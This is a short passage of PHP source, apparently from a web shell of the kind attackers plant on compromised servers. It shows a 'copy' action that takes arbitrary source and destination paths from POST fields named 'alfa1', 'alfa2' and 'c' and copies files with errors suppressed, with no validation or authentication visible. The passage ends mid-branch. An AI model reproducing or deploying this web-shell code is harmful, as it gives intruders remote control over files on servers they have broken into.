			}
		}
	}elseif($action == "copy"){
		if(is_dir($_POST["alfa1"])){
			$dir = str_replace('//', '/', $_POST["alfa1"]);
			$dir = explode('/', $dir);
			if(empty($dir[count($dir) - 1])){
				$name = $dir[count($dir) - 2];
			}else{
				$name = $dir[count($dir) - 1];
			}
		}else{
			$name = basename($_POST["alfa1"]);
		}
		$dir = dirname($_POST["alfa1"]);
		if($dir == "."){
			$dir = $_POST["c"]."/";
		}
		if(is_file($_POST["alfa1"])){
			@copy($_POST["alfa1"], $_POST["alfa2"]);
